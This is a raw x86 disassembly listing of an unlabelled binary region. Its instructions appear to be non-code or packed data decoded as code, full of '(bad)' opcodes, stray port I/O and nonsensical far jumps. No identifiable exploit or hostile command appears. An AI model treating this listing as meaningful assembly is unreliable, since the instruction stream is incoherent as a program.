  4179e5:	and    DWORD PTR [ecx+ebp*4+0x5e762d42],ebx
  4179ec:	mov    eax,0xaa8dbc8
  4179f1:	aam    0xb0
  4179f3:	jb     0x417a1c
  4179f5:	inc    esp
  4179f6:	jmp    0xfe18:0x863c8450
  4179fd:	jmp    0x4179bc
  4179ff:	cmp    DWORD PTR [ebx+0x32],esp
  417a02:	mov    ds:0x7ea53e2f,eax
  417a07:	xchg   ecx,eax
  417a08:	and    esi,DWORD PTR [edx]
  417a0a:	aad    0xad
  417a0c:	sar    DWORD PTR [ebp-0x67be3f43],cl
  417a12:	pop    eax
  417a13:	inc    ebp
  417a14:	imul   edx,DWORD PTR [ecx],0x9
  417a17:	loop   0x417a2c
  417a19:	cmp    al,dh
  417a1b:	xor    al,0x33
  417a1d:	outs   dx,BYTE PTR ds:[esi]
  417a1e:	out    dx,eax
  417a1f:	or     eax,0xafe99d1a
  417a24:	jmp    0x417a8b
  417a26:	in     al,0x10
  417a28:	addr16 mov esp,0x6de29bc7
  417a2e:	push   ds
  417a2f:	(bad)  
  417a30:	mov    ch,0xc7
  417a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a33:	call   0xba38:0x973fe42d
  417a3a:	sbb    al,0x37
  417a3c:	mov    cl,0xe9
  417a3e:	sbb    BYTE PTR [edi],bh
  417a40:	inc    ebx
  417a41:	fs dec ebp
  417a43:	adc    ebx,0xffffffe9
  417a46:	shr    DWORD PTR [esi],0xf5
  417a49:	cld    
  417a4a:	jg     0x4179d9
  417a4c:	xchg   edx,eax
  417a4d:	daa    
  417a4e:	repnz sub eax,0x5879a446
  417a54:	or     bl,BYTE PTR [edx+0x401f806f]
  417a5a:	and    eax,0x24555b87
  417a5f:	test   eax,0xfc7a5855
  417a64:	bound  esp,QWORD PTR cs:[esi+eax*8+0x24]
  417a69:	sbb    DWORD PTR [ebp+0x5f],edx
  417a6c:	fwait
  417a6d:	push   0xa1b10913
  417a72:	adc    DWORD PTR [ebx],ecx
  417a74:	cld    
  417a75:	mov    dh,0x2c
  417a77:	cmp    al,0x95
  417a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a7a:	shl    DWORD PTR [eax+edx*2],cl
  417a7d:	mov    ebp,0xebeb2a2c
  417a82:	fs cwde 
  417a84:	jg     0x417aa7
  417a86:	mov    esp,0xcda323d4
  417a8b:	add    esp,DWORD PTR [edi-0x6fe5e9d7]
	...
  417af1:	add    BYTE PTR [eax],al
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x10692f5f]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0x3a000001
  417b0d:	pusha  
  417b0e:	retf   
  417b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b10:	sti    
  417b11:	pop    es
  417b12:	sub    al,0x9d
  417b14:	lods   al,BYTE PTR ds:[esi]
  417b15:	mov    esi,0x50523573
  417b1a:	test   BYTE PTR [esi-0x21],bl
  417b1d:	cmp    BYTE PTR ds:0x54bf1e28,0x1c
  417b24:	es jns 0x417ae7
  417b27:	ins    BYTE PTR es:[edi],dx
  417b28:	mov    ds:0xb99f9d03,al
  417b2d:	mov    dl,0x78
  417b2f:	sahf   
  417b30:	mov    edi,0x9b550517
  417b35:	icebp  
  417b36:	test   al,0x34
  417b38:	jg     0x417afa
  417b3a:	push   0xffffffb9
  417b3c:	imul   ebp,DWORD PTR [edi+esi*4],0xffffffe3
  417b40:	retf   0x3914
  417b43:	repnz neg DWORD PTR [esi]
  417b46:	and    cl,BYTE PTR [ebp+0x51]
  417b49:	push   0xffffff93
  417b4b:	sbb    al,0xa5
  417b4d:	hlt    
  417b4e:	shr    DWORD PTR [esi-0x19b9fd49],1
  417b54:	(bad)  
  417b55:	mov    ebx,0xd725d650
  417b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b5b:	pusha  
  417b5c:	sub    ebx,DWORD PTR [edi-0x7d309ffa]
  417b62:	or     al,0xfd
  417b64:	pop    eax
  417b65:	stos   BYTE PTR es:[edi],al
  417b66:	pushf  
  417b67:	ins    BYTE PTR es:[edi],dx
  417b68:	inc    ebx
  417b69:	sub    ebp,edx
  417b6b:	push   ecx
  417b6c:	pop    es
  417b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b6e:	into   
  417b6f:	sbb    ecx,edi
  417b71:	aas    
  417b72:	sub    DWORD PTR [eax+0x7449c9fd],0xffffffe1
  417b79:	(bad)  
  417b7a:	mov    dl,0xcd
  417b7c:	mov    edi,0xc3f6a309
  417b81:	dec    edx
  417b82:	xchg   edi,eax
  417b83:	add    esp,ecx
  417b85:	inc    ebp
  417b86:	mov    ?,WORD PTR [ebx-0x4c765880]
  417b8c:	lahf   
  417b8d:	cs stos BYTE PTR es:[edi],al
  417b8f:	(bad)  
  417b91:	mov    ebx,0xcb859956
  417b96:	mov    ds,WORD PTR [edi+0xc44b25]
  417b9c:	fdiv   DWORD PTR [esi+0x6e]
  417b9f:	arpl   WORD PTR [ebp-0x492b2f7a],cx
  417ba5:	shl    BYTE PTR [eax],1
  417ba7:	pusha  
  417ba8:	outs   dx,BYTE PTR ds:[esi]
  417ba9:	pop    ss
  417baa:	lea    edi,[edx*1-0x643aa1c7]
  417bb1:	aam    0xda
  417bb3:	mov    dh,0xd3
  417bb5:	ss (bad) 
  417bb7:	adc    al,0xe9
  417bb9:	push   ss
  417bba:	cmp    DWORD PTR ss:[ecx],edx
  417bbd:	hlt    
  417bbe:	arpl   WORD PTR [eax],bx
  417bc0:	mov    ebx,0x38a828
  417bc5:	loopne 0x417b6f
  417bc7:	lods   eax,DWORD PTR ds:[esi]
  417bc8:	xor    DWORD PTR [esp+edi*2+0x6f01a885],ebx
  417bcf:	sub    BYTE PTR [edx+0x4b],0xdf
  417bd3:	repz mov eax,0x7259a81c
  417bd9:	cwde   
  417bda:	fwait
  417bdb:	(bad)
  417bde:	push   esp
  417bdf:	inc    edi
  417be0:	clc    
  417be1:	and    al,bh
  417be3:	mov    WORD PTR [ebp+0x329298d0],ds
  417be9:	out    0x10,al
  417beb:	out    dx,al
  417bec:	pop    es
  417bed:	adc    al,dh
  417bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bf0:	mov    ebx,0xaea4b368
  417bf5:	mov    cl,0x7c
  417bf7:	rol    ch,1
  417bf9:	fldpi  
  417bfb:	cmp    bl,BYTE PTR [edi+0xbd46fd0]
  417c01:	xchg   ebp,eax
  417c02:	sub    al,0xf4
  417c04:	sub    eax,0x650b7761
  417c09:	xchg   BYTE PTR [edx+eiz*2],al
  417c0c:	bound  edi,QWORD PTR [ebx-0x78]
  417c0f:	sub    eax,0x2d
	...
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0xa4
  417c81:	jnp    0x417cb9
  417c83:	arpl   WORD PTR [ecx+0x50000fb],bp
  417c89:	add    DWORD PTR [eax],eax
  417c8b:	add    BYTE PTR [eax+0x73],ch
  417c8e:	pop    edi
  417c8f:	scas   al,BYTE PTR es:[edi]
  417c90:	jbe    0x417d0f
  417c92:	sti    
  417c93:	and    bl,BYTE PTR [edx+0x40e3dfac]
  417c99:	and    bh,ah
  417c9b:	or     BYTE PTR [ecx+0x445a16f2],ch
  417ca1:	jnp    0x417c89
  417ca3:	(bad)  
  417ca4:	inc    esi
  417ca5:	test   al,0x1
  417ca7:	push   eax
  417ca8:	(bad)  
  417ca9:	sbb    BYTE PTR [ebp+0x32b330e5],al
  417caf:	sub    eax,0xe7072770
  417cb4:	and    al,0x85
  417cb6:	sti    
  417cb7:	dec    esp
  417cb8:	and    DWORD PTR [ebx],ecx
  417cba:	cwde   
  417cbb:	pop    ebp
  417cbc:	mov    dl,0x1
  417cbe:	not    DWORD PTR [ebx+edi*8-0x79a06729]
  417cc5:	fwait
  417cc6:	aad    0xe2
  417cc8:	loopne 0x417cf7
  417cca:	mov    al,0x73
  417ccc:	sbb    eax,0x8515ddc9
  417cd1:	dec    ebp
  417cd2:	loope  0x417ca7
  417cd4:	sbb    al,0xfc
  417cd6:	and    ebx,DWORD PTR [esi+0x1ff3987c]
  417cdc:	pop    es
  417cdd:	add    ebx,DWORD PTR [ecx+0x6]
  417ce0:	aad    0x40
  417ce2:	cmp    al,0xfd
  417ce4:	rcl    BYTE PTR [esi+edi*4-0x56aa83fe],cl
  417ceb:	add    edi,eax
  417ced:	sahf   
  417cee:	pop    esp
  417cef:	inc    ecx
  417cf0:	addr16 int 0xaf
  417cf3:	adc    DWORD PTR [edx+0x6619beb7],ecx
  417cf9:	leave  
  417cfa:	mov    dh,0xe8
  417cfc:	adc    al,0xc6
  417cfe:	dec    ebp
  417cff:	lea    edi,[ebp-0x2]
  417d02:	test   al,0xb9
  417d04:	cmc    
  417d05:	jge    0x417c9e
  417d07:	mov    bh,0xda
  417d09:	push   cs
  417d0a:	xor    bl,BYTE PTR [ecx+0x71]
  417d0d:	into   
  417d0e:	call   0xedc3:0x47448c40
  417d15:	mov    dl,0x70
  417d17:	mov    ds:0x60cc6ad1,eax
  417d1c:	sahf   
  417d1d:	mov    bl,0xdc
  417d1f:	mov    ch,0x93
  417d21:	ret    0xb493
  417d24:	bound  ecx,QWORD PTR [esi-0x70]
  417d27:	sti    
  417d28:	fstp   TBYTE PTR [ebx+0x33]
  417d2b:	jecxz  0x417cea
  417d2d:	inc    eax
  417d2e:	mov    gs:0xe00e6fb4,al
  417d34:	imul   ebx,DWORD PTR ds:[ebx+0x5182ecce],0x91ad4ea6
  417d3f:	cld    
  417d40:	push   ebx
  417d41:	xor    esi,DWORD PTR ds:0x9c17adc9
  417d47:	inc    ebx
  417d48:	enter  0x6ce9,0x2c
  417d4c:	jae    0x417d5c
  417d4e:	jl     0x417d00
  417d50:	inc    ebx
  417d51:	imul   eax,DWORD PTR [edi],0xbc7a4483
  417d57:	cmc    
  417d58:	or     al,0xe8
  417d5a:	test   BYTE PTR [ebp-0xa],bl
  417d5d:	hlt    
  417d5e:	push   cs
  417d5f:	mov    ds:0x94407162,al
  417d64:	aad    0x94
  417d66:	not    bl
  417d68:	scas   al,BYTE PTR es:[edi]
  417d69:	stos   BYTE PTR es:[edi],al
  417d6a:	adc    eax,0xb49640cc
  417d6f:	inc    ebx
  417d70:	fstp   TBYTE PTR [edx]
  417d72:	push   edi
  417d73:	sbb    al,0x6a
  417d75:	loop   0x417da5
  417d77:	push   cs
  417d78:	sub    bh,bl
  417d7a:	jle    0x417d69
  417d7c:	fst    QWORD PTR [edx+0x1bef3335]
  417d82:	xor    BYTE PTR [ecx],cl
  417d84:	mov    edx,DWORD PTR [esi]
  417d86:	daa    
  417d87:	or     eax,0xef488e9e
  417d8c:	xrelease mov BYTE PTR [ebx+0x52b5],dl
	...
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	pop    ss
  417e01:	mov    bh,0x70
  417e03:	or     al,0xae
  417e05:	cld    
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    eax,0x7f000001
  417e0d:	in     al,dx
  417e0e:	loop   0x417dfa
  417e10:	cdq    
  417e11:	adc    bl,BYTE PTR [ebx+0x5a]
  417e14:	or     eax,0x7446f28
  417e19:	fwait
  417e1a:	jno    0x417dc7
  417e1c:	repz mov bh,0x1d
  417e1f:	ret    
  417e20:	rcl    BYTE PTR [esp+0x21],cl
  417e24:	stos   DWORD PTR es:[edi],eax
  417e25:	les    eax,FWORD PTR [eax]
  417e27:	cld    
  417e28:	mov    bh,0x4a
  417e2a:	fcomp  QWORD PTR [ecx]
  417e2c:	sub    DWORD PTR [ebx-0x5ad551c0],0x7b5f7363
  417e36:	jmp    0x417e34
  417e38:	or     eax,0x198da7c8
  417e3d:	sbb    al,0x51
  417e3f:	dec    ecx
  417e40:	mov    ecx,0xeb21f556
  417e45:	pushf  
  417e46:	sub    esi,esp
  417e48:	or     al,0xf9
  417e4a:	pop    esi
  417e4b:	mov    eax,0x367c28ce
  417e50:	imul   eax,edi,0x471c81e9
  417e56:	add    BYTE PTR [eax+ebx*4+0x52],al
  417e5a:	xchg   ebp,eax
  417e5b:	stos   DWORD PTR es:[edi],eax
  417e5c:	jmp    0x95e6875e
  417e61:	and    dl,BYTE PTR [edx+eax*2-0xe443621]
  417e68:	push   ebx
  417e69:	retf   0xb36b
  417e6c:	dec    ebx
  417e6d:	(bad)  
  417e6e:	bound  esi,QWORD PTR [esi-0x3a0d0687]
  417e74:	enter  0xc265,0x7d
  417e78:	cs js  0x417eda
  417e7b:	repz fs (bad) 
  417e7e:	int    0x71
  417e80:	mov    edx,0x9c49edce
  417e85:	xchg   esp,eax
  417e86:	dec    ebp
  417e87:	js     0x417e33
  417e89:	(bad)  
  417e8a:	scas   eax,DWORD PTR es:[edi]
  417e8b:	dec    edx
  417e8c:	test   DWORD PTR [esi-0x80],eax
  417e8f:	fld    DWORD PTR [edi+0x766ee47e]
  417e95:	mov    edx,?
  417e97:	jge    0x417ec0
  417e99:	addr16 aas 
  417e9b:	and    al,0xad
  417e9d:	iret   
  417e9e:	shr    eax,cl
  417ea0:	cmp    BYTE PTR [esi-0xb],ch
  417ea3:	xchg   esi,ebp
  417ea5:	and    DWORD PTR [edi-0x147cf6f],eax
  417eab:	stos   BYTE PTR es:[edi],al
  417eac:	pop    es
  417ead:	xchg   ebx,eax
  417eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eaf:	out    0xb8,eax
  417eb1:	sti    
  417eb2:	call   0xdf5c:0x306789d8
  417eb9:	bound  esi,QWORD PTR [ecx-0x4e2922d9]
  417ebf:	mov    dh,0xaa
  417ec1:	bound  esp,QWORD PTR [esi]
  417ec3:	mov    al,0xca
  417ec5:	test   BYTE PTR [esi-0x4f8d81c0],bh
  417ecb:	push   cs
  417ecc:	cld    
  417ecd:	fmul   DWORD PTR [esi+0x42]
  417ed0:	(bad)  
  417ed1:	loopne 0x417f07
  417ed3:	mov    al,ds:0x9399d6c0
  417ed8:	mov    bh,0x89
  417eda:	loopne 0x417f54
  417edc:	sub    al,0xae
  417ede:	pop    ebx
  417edf:	ror    DWORD PTR [edx-0x57],1
  417ee2:	and    eax,0x2f92bf84
  417ee7:	xor    DWORD PTR [edi+0x5bf7e135],0x5aec80f7
  417ef1:	test   al,0x33
  417ef3:	sub    eax,0xb8150e47
  417ef8:	push   esp
  417ef9:	lea    ebx,[ecx-0x7640a2a7]
  417eff:	hlt    
  417f00:	pop    edi
  417f01:	mov    ebx,0x4261ab02
  417f06:	mov    eax,DWORD PTR [ecx-0x52a6eb58]
  417f0c:	repnz cmp edi,edi
  417f0f:	loope  0x417eed
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	je     0x417f7f
  417f82:	dec    ebp
  417f83:	fnstenv [ebx+0x50000fd]
  417f89:	add    DWORD PTR [eax],eax
  417f8b:	add    BYTE PTR [eax+0xf],dh
  417f8e:	aas    
  417f8f:	rcr    BYTE PTR [edi],0x6e
  417f92:	test   ch,dl
  417f94:	fadd   QWORD PTR [eax-0x6f]
  417f97:	jb     0x417fad
  417f99:	inc    esp
  417f9a:	cdq    
  417f9b:	cld    
  417f9c:	jp     0x417fe5
  417f9e:	cmc    
  417f9f:	es mov dl,0x42
  417fa2:	xchg   ecx,eax
  417fa3:	xor    eax,DWORD PTR ds:0xcc1a04f9
  417fa9:	shl    BYTE PTR [ebp+0x73658875],cl
  417faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fb0:	imul   esp,DWORD PTR [ebp+0x4d7e26fe],0x6a
  417fb7:	aaa    
  417fb8:	jns    0x417f95
  417fba:	es fucomp st(0)
  417fbd:	test   esi,0x11378ef4
  417fc3:	lds    ebx,FWORD PTR [eax]
  417fc5:	sti    
  417fc6:	mov    DWORD PTR [ebx],esp
  417fc8:	dec    esp
  417fc9:	mov    bl,0x79
  417fcb:	sbb    edi,DWORD PTR [eax+ebp*8+0x3410b0e9]
  417fd2:	call   0xa08b613f
  417fd7:	ds ins BYTE PTR es:[edi],dx
  417fd9:	in     eax,dx
  417fda:	sub    eax,0x6334357e
  417fdf:	adc    cl,BYTE PTR [ecx-0x14346b40]
  417fe5:	in     al,0xf8
  417fe7:	sub    ah,BYTE PTR [edi+0x65]
  417fea:	(bad)  
  417feb:	xchg   edi,eax
  417fec:	lods   al,BYTE PTR ds:[esi]
  417fed:	xchg   ebx,eax
  417fee:	cdq    
  417fef:	test   eax,0x5931807b
  417ff4:	mov    ecx,0x108dd39d
  417ff9:	cmp    esi,DWORD PTR [edx-0x2a587249]
  417fff:	rcr    DWORD PTR [eax-0x6897041c],1
  418005:	cld    
  418006:	fs add ch,bh
  418009:	(bad)  
  41800a:	mov    ds:0x2c02ba5a,al
  41800f:	inc    eax
  418010:	ds sahf 
  418012:	sti    
  418013:	mov    BYTE PTR [ebx+0x11],ah
  418016:	inc    esp
  418017:	sar    DWORD PTR [ecx+0x5ad73674],cl
  41801d:	sahf   
  41801e:	(bad)  
  41801f:	xor    al,0xf7
  418021:	push   edx
  418022:	push   ebx
  418023:	ds sahf 
  418025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418026:	push   0xfffffffe
  418028:	pop    ebx
  418029:	outs   dx,BYTE PTR ds:[esi]
  41802a:	inc    eax
  41802b:	fwait
  41802c:	arpl   WORD PTR [ebx-0x1],bp
  41802f:	aaa    
  418030:	mov    bh,BYTE PTR [ecx-0x15]
  418033:	out    dx,al
  418034:	push   es
  418035:	sbb    DWORD PTR [ecx],0xffffffc2
  418038:	or     DWORD PTR [edx-0x56a78908],ebx
  41803e:	jge    0x4180ad
  418040:	push   eax
  418041:	sub    dl,BYTE PTR [eax+ecx*8+0x46e61f17]
  418048:	popa   
  418049:	inc    eax
  41804a:	int    0x7e
  41804c:	je     0x418047
  41804e:	shl    edi,1
  418050:	icebp  
  418051:	fild   QWORD PTR [esi+0x66]
  418054:	jmp    0x211ef091
  418059:	jp     0x41806c
  41805b:	cwde   
  41805c:	cmp    edx,DWORD PTR [ecx+0x12]
  41805f:	inc    esi
  418060:	xlat   BYTE PTR ds:[ebx]
  418061:	call   0x410b8d9d
  418066:	int    0xed
  418068:	loopne 0x4180cb
  41806a:	adc    BYTE PTR [edi-0x16ecc314],bl
  418070:	imul   eax,DWORD PTR [ecx+ecx*4+0x44ad1112],0x45
  418078:	jmp    0xb717:0xf263
  41807e:	dec    ecx
  41807f:	into   
  418080:	nop
  418081:	aas    
  418082:	outs   dx,BYTE PTR ds:[esi]
  418083:	push   ebx
  418084:	dec    edi
  418085:	jno    0x4180ab
  418087:	mov    esi,0x49e5d4
  41808c:	mov    esp,0x73d07ec6
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x5c2fdebc,eax
  418101:	dec    esp
  418102:	pop    edx
  418103:	addr16 mov eax,0x50000fe
  418109:	add    DWORD PTR [eax],eax
  41810b:	add    BYTE PTR [esi-0x2b],al
  41810e:	fidiv  DWORD PTR [edi+0x71]
  418111:	lods   eax,DWORD PTR ds:[esi]
  418112:	pushf  
  418113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418114:	ror    BYTE PTR [ebx],0x30
  418117:	iret   
  418118:	loop   0x4180c7
  41811a:	rcl    BYTE PTR [ecx-0x75],1
  41811d:	les    ebx,FWORD PTR [edx-0x667bd9bb]
  418123:	sub    eax,0x3c2a03a4
  418128:	mov    eax,ds:0x9ef37016
  41812d:	pop    edx
  41812e:	mov    ds:0x2b112a53,al
  418133:	sbb    dh,BYTE PTR [ebx]
  418135:	mov    dl,0xec
  418137:	lahf   
  418138:	je     0x418116
  41813a:	ss push eax
  41813c:	adc    DWORD PTR ds:0xb7d18408,ecx
  418142:	ror    BYTE PTR [ebp+0x6d],cl
  418145:	jg     0x41818e
  418147:	imul   edx,DWORD PTR [ecx+0x273be6e8],0xffffff8b
  41814e:	and    BYTE PTR [ecx-0x31],dh
  418151:	retf   0x4125
  418154:	cmp    cl,BYTE PTR [edx-0x20]
  418157:	idiv   DWORD PTR [eax-0x68b07c41]
  41815d:	dec    ecx
  41815e:	xchg   ecx,eax
  41815f:	stc    
  418160:	cmp    al,0x12
  418162:	mov    dh,0xbb
  418164:	sbb    DWORD PTR [edx+0x24],eax
  418167:	mov    edi,fs
  418169:	adc    BYTE PTR [ebx],ah
  41816b:	hlt    
  41816c:	mov    dl,0x94
  41816e:	pop    ebx
  41816f:	cs xchg ebp,eax
  418171:	imul   esp,DWORD PTR [ecx-0x8],0x10a76cd6
  418178:	pop    es
  418179:	out    dx,eax
  41817a:	and    BYTE PTR [ecx],dh
  41817c:	ror    BYTE PTR [ecx+0x30],1
  41817f:	or     ebp,ebx
  418181:	cmc    
  418182:	or     BYTE PTR [edx],bl
  418184:	sub    ecx,DWORD PTR [eax-0x7f69730d]
  41818a:	jbe    0x418209
  41818c:	out    0xa4,al
  41818e:	repnz and bl,BYTE PTR ds:0xbdf98a0a
  418195:	(bad)  
  418197:	fdivr  DWORD PTR [esi-0x21]
  41819a:	into   
  41819b:	mov    dh,0xf3
  41819d:	lods   al,BYTE PTR ds:[esi]
  41819e:	nop
  41819f:	inc    eax
  4181a0:	push   0xffffffe1
  4181a2:	push   cs
  4181a3:	jecxz  0x418210
  4181a5:	(bad)  
  4181a6:	(bad)  
  4181a7:	jae    0x4181fe
  4181a9:	dec    ebx
  4181aa:	or     ah,BYTE PTR ds:0x8806ae94
  4181b0:	ins    DWORD PTR es:[edi],dx
  4181b1:	repz mov eax,ds:0xeb24f566
  4181b7:	inc    edi
  4181b8:	sbb    al,0x98
  4181ba:	and    eax,0xce8fbbec
  4181bf:	mov    bh,0xbd
  4181c1:	sub    DWORD PTR [eax+0x73f9f7ff],ebp
  4181c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181c8:	lea    esi,[edi+0x4d]
  4181cb:	lahf   
  4181cc:	mov    bh,0xa2
  4181ce:	pusha  
  4181cf:	sub    DWORD PTR [esi],ebx
  4181d1:	into   
  4181d2:	pop    esi
  4181d3:	cld    
  4181d4:	inc    di
  4181d6:	mov    eax,ds:0xf7b4be37
  4181db:	test   BYTE PTR [edx],0xbf
  4181de:	dec    ebx
  4181df:	repnz xchg edi,eax
  4181e1:	xchg   edi,eax
  4181e2:	pop    ebp
  4181e3:	mov    al,ah
  4181e5:	mov    dl,0xdf
  4181e7:	or     ecx,eax
  4181e9:	mov    cl,0x1b
  4181eb:	push   ecx
  4181ec:	fstp   TBYTE PTR [ebp-0x5c]
  4181ef:	imul   edi,DWORD PTR [ecx-0x17],0xfaa03396
  4181f6:	sub    eax,0xfe63b76
  4181fb:	xchg   DWORD PTR [edi-0x4b],ebp
  4181fe:	inc    eax
  4181ff:	ror    dh,cl
  418201:	sub    BYTE PTR [edi-0x55],0xd9
  418205:	pop    ecx
  418206:	in     al,dx
  418207:	sbb    bh,0x7c
  41820a:	pushf  
  41820b:	dec    esp
  41820c:	or     DWORD PTR [edi+ebx*4],0xfffffff6
  418210:	test   al,0x0
	...
  418272:	add    BYTE PTR [eax],al
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x8047b8d6
  418282:	adc    eax,0xffbd0d
  418287:	add    BYTE PTR ds:0x61000001,al
  41828d:	fwait
  41828e:	mov    edx,0xac6d8321
  418293:	sti    
  418294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418295:	dec    ecx
  418296:	(bad)  
  418297:	jb     0x4182a0
  418299:	outs   dx,BYTE PTR ds:[esi]
  41829a:	mov    ebp,0xf45ddf31
  41829f:	loop   0x418293
  4182a1:	sbb    eax,0x37fbdfb
  4182a6:	sub    edx,eax
  4182a8:	das    
  4182a9:	mov    al,0x4b
  4182ab:	xchg   BYTE PTR [eax+0x28c48319],dl
  4182b1:	adc    BYTE PTR [edx+0x12],0x6f
  4182b5:	fisubr WORD PTR [ebx-0x66]
  4182b8:	imul   esp,esp,0x8b626ff1
  4182be:	dec    esp
  4182bf:	sub    esi,DWORD PTR [ebx+0x43]
  4182c2:	jle    0x41826a
  4182c4:	pop    ss
  4182c5:	add    dh,BYTE PTR [edi+0x34]
  4182c8:	inc    edi
  4182c9:	jnp    0x4182d6
  4182cb:	(bad)  
  4182cc:	into   
  4182cd:	outs   dx,DWORD PTR es:[esi]
  4182cf:	ret    
  4182d0:	push   ecx
  4182d1:	adc    BYTE PTR [edx+0x931de0d],dh
  4182d7:	leave  
  4182d8:	int    0xeb
  4182da:	pop    es
  4182db:	xlat   BYTE PTR ds:[ebx]
  4182dc:	sub    eax,0x2d47af39
  4182e1:	pop    ebx
  4182e2:	sub    DWORD PTR [ecx-0x68e94dc5],edx
  4182e8:	stos   BYTE PTR es:[edi],al
  4182e9:	mov    ss,WORD PTR [eax-0xc]
  4182ec:	adc    DWORD PTR [ebx],esi
  4182ee:	xor    ecx,eax
  4182f0:	jne    0x4182d2
  4182f2:	adc    BYTE PTR [esi],dl
  4182f4:	xchg   edx,eax
  4182f5:	in     eax,0xae
  4182f7:	daa    
  4182f8:	inc    ebp
  4182f9:	jae    0x4182ce
  4182fb:	adc    DWORD PTR ss:[eax+ebx*8+0x59],ecx
  418300:	pop    es
  418301:	mov    al,ds:0x89e96604
  418306:	and    ch,BYTE PTR [edi]
  418308:	mov    cl,0x81
  41830a:	cmp    esp,eax
  41830c:	ja     0x41837f
  41830e:	popf   
  41830f:	push   ebp
  418310:	adc    ecx,edi
  418312:	ins    BYTE PTR es:[edi],dx
  418313:	sub    BYTE PTR [esi+0x11],dl
  418316:	rcl    DWORD PTR [ebp+0x546c19e9],0xc2
  41831d:	push   eax
  41831e:	or     eax,DWORD PTR [edx+0x2c]
  418321:	mov    esi,0xbf9b2f1b
  418326:	xlat   BYTE PTR ds:[ebx]
  418327:	call   0x7f1e0d96
  41832c:	stc    
  41832d:	push   DWORD PTR [eax+0xb]
  418330:	mov    BYTE PTR [esi-0x59],bh
  418333:	out    0x72,al
  418335:	jne    0x418324
  418337:	aam    0xb
  418339:	es cs mov cl,ch
  41833d:	push   esp
  41833e:	in     eax,dx
  41833f:	out    dx,eax
  418340:	mov    esp,0xe427db83
  418345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418346:	stos   DWORD PTR es:[edi],eax
  418347:	out    dx,al
  418348:	daa    
  418349:	adc    al,0xf1
  41834b:	out    0xba,al
  41834d:	(bad)  
  41834e:	out    dx,al
  41834f:	jb     0x418383
  418351:	sub    al,0xc1
  418353:	cmp    ebx,DWORD PTR [ebx-0x4c]
  418356:	mov    eax,0xae38f516
  41835b:	idiv   DWORD PTR [ebx-0x6ff4c211]
  418361:	(bad)  
  418362:	xor    eax,edx
  418364:	bound  esi,QWORD PTR [eax-0x5e]
  418367:	(bad)  
  418368:	fstp   DWORD PTR [ecx+0x2868fc08]
  41836e:	stos   BYTE PTR es:[edi],al
  41836f:	add    DWORD PTR [edx-0x21d18306],ebp
  418375:	sti    
  418376:	inc    ebx
  418377:	xchg   ebx,eax
  418378:	adc    ebx,eax
  41837a:	cmc    
  41837b:	pop    ebp
  41837c:	sahf   
  41837d:	pop    fs
  41837f:	and    BYTE PTR [ecx],0xe2
  418382:	loop   0x41838a
  418384:	pop    esi
  418385:	add    bh,BYTE PTR [ebp+0x51]
  418388:	aam    0xf1
  41838a:	fcomp  QWORD PTR [esi+ecx*8+0x6]
  41838e:	xor    DWORD PTR [edx+0x11],edx
	...
  4183f1:	add    BYTE PTR [eax],al
  4183f3:	add    ah,bl
  4183f5:	mov    bl,0x3f
  4183f7:	push   eax
  4183f8:	jg     0x4183d6
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	jl     0x418472
  418402:	add    ah,ch
  418404:	ret    0x100
  418407:	add    BYTE PTR ds:0x8000001,al
  41840d:	loope  0x4183e4
  41840f:	fidivr WORD PTR [ebx-0x12]
  418412:	jmp    0x4183c5
  418414:	mov    ds:0xd6bc6650,eax
  418419:	jp     0x4183fd
  41841b:	mov    dh,0x7d
  41841d:	cs shl al,1
  418420:	js     0x4183f6
  418422:	fild   QWORD PTR [eax+ebx*8]
  418425:	sar    BYTE PTR [ecx+0x29],0x4c
  418429:	(bad)  
  41842a:	pop    ebp
  41842b:	div    DWORD PTR [eax+0x1b3f641f]
  418431:	fs int 0x41
  418434:	out    dx,eax
  418435:	in     eax,dx
  418436:	jmp    0x41847c
  418438:	sbb    eax,0xa70b98ae
  41843d:	cmp    al,0x4d
  41843f:	clc    
  418440:	xchg   edi,eax
  418441:	sub    BYTE PTR [edx],al
